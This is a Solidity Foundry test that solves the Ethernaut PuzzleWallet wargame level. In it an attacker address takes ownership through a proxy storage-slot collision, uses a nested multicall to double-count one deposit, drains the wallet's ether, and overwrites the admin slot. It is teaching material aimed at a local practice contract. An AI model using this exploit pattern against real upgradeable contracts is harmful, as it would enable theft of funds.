// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/PuzzleWallet.sol";

// 1. exploit the wrong layout of the implementation not reserving storage slots for the proxy
// 2. use an inner multicall to bypass the reentrancy lock on the outer multicall
contract PuzzleWalletTest is Test {
    PuzzleWallet instance;
    PuzzleWallet walletLogic;
    PuzzleProxy proxy;
    address attacker = makeAddr("attacker");

    function setUp() public {
        walletLogic = new PuzzleWallet();
        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);
        proxy = new PuzzleProxy(address(this), address(walletLogic), data);
        instance = PuzzleWallet(address(proxy));

        vm.deal(address(this), 0.1 ether);
        instance.addToWhitelist(address(this));
        instance.deposit{value: 0.1 ether}();

        vm.deal(attacker, 0.1 ether);
    }

    function test() public {
        assertEq(proxy.admin(), address(this));

        // 1. proposeNewAdmin() to become the owner
        proxy.proposeNewAdmin(attacker);
        assertEq(proxy.pendingAdmin(), attacker);
        assertEq(instance.owner(), attacker);

        // 2. addToWhitelist() to bypass onlyWhitelisted
        vm.prank(attacker);
        instance.addToWhitelist(attacker);
        assertEq(instance.whitelisted(attacker), true);

        // 3. multicall() with deposit() and innerMulticall(), which includes another deposit(),
        //    to reenter multicall() to avoid depositCalled restriction
        //    since there're two deposit() here, can append msg.value the same as the current balance 0.1
        //    s.t. balances[msg.sender] = 0.2 and can withdraw all to make address(this).balance == 0
        bytes memory depositSelector = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory nestedData = new bytes[](1);
        nestedData[0] = depositSelector;
        bytes memory innerMulticallData = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedData);

        bytes[] memory outerMulticallData = new bytes[](2);
        outerMulticallData[0] = depositSelector;
        outerMulticallData[1] = innerMulticallData;
        // [0xd0e30db0,0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000]
        // console.logBytes(outerMulticallData[0]);
        // console.logBytes(outerMulticallData[1]);

        vm.startPrank(attacker);
        instance.multicall{value: 0.1 ether}(outerMulticallData);
        assertEq(instance.balances(attacker), 0.2 ether);
        assertEq(attacker.balance, 0);

        // 4. execute() with the total value of the address balance 0.2 can make address(this).balance == 0
        instance.execute(attacker, 0.2 ether, bytes(""));
        assertEq(attacker.balance, 0.2 ether);

        // 5. setMaxBalance() with the casting from the address of the attacker to become admin()
        instance.setMaxBalance(uint256(uint160(attacker)));
        assertEq(proxy.admin(), attacker);

        // console.logUint(uint256(uint160(vm.envAddress("MY_ADDRESS"))));
    }
}
